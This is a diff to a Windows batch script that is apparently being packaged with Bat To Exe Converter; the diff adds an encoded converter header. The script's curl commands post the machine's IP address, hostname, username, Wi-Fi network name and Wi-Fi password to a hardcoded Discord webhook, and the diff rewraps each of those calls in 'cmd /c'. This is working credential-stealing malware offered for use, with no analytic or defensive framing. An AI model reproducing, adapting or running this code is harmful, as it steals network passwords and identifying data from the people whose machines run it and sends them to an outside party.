@@ -1,3 +1,36 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDd4YDimOXixEroM1Njp4O2CtlkSGfE6dpXal6CHNO8f5QvtdplN
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDd4YDimOXixEroM1Ozy/OmIsEkeRuc7R4fU1b+LMq4W8kCE
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
 @echo off
 chcp 65001 > nul
 setlocal enabledelayedexpansion
@@ -38,16 +71,16 @@ del ssid.txt
 
 set webhook="https://discordapp.com/api/webhooks/1288994255355772948/_y-tOeyzn0escJxZNuathSLEGDuWjZlzo_Q2BNA3tyAhWF2QJ5yK4X9SnQxIhnYsgqwy"
 
-curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line1%\"}" %webhook%
-timeout /t 0 > nul
-curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ip%\"}" %webhook%
-timeout /t 0 > nul
-curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%host%\"}" %webhook%
-timeout /t 0 > nul
-curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%user%\"}" %webhook%
-timeout /t 0 > nul
-curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ssid%\"}" %webhook%
-timeout /t 0 > nul
-curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipass%\"}" %webhook%
-timeout /t 0 > nul
-curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line1%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ip%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%host%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%user%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ssid%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipass%\"}" %webhook%
+cmd /c timeout /t 0 > nul
+cmd /c curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%
